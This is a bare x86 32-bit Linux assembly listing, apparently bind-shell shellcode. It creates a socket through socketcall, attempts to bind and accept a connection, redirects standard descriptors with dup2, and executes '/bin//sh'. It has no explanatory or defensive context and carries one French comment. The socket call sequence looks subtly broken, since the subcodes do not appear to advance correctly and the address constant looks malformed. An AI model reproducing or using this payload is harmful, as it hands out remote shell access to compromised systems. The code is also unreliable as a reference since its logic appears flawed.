BITS 32
xor eax,eax
xor ebx,ebx
cdq ;ca etend a 64bits le contenu signé de eax
push eax
push byte 0x1
push byte 0x2
mov ecx,esp
inc bl
mov al,102
int 0x80
mov esi,eax

push edx 
push long 0xAAAA02AA
mov ecx,esp
push byte 0x10
push ecx
push esi
mov al,102
int 0x80

push edx
push edx
push esi
mov ecx,esp
inc bl
mov al,102
int 0x80
mov ebx,eax

xor ecx,ecx
mov cl,3
loop:
dec cl
mov al,63
int 0x80
jnz loop
Push edx
push long 0x68732f2f
push long 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0x0b
int 0x80





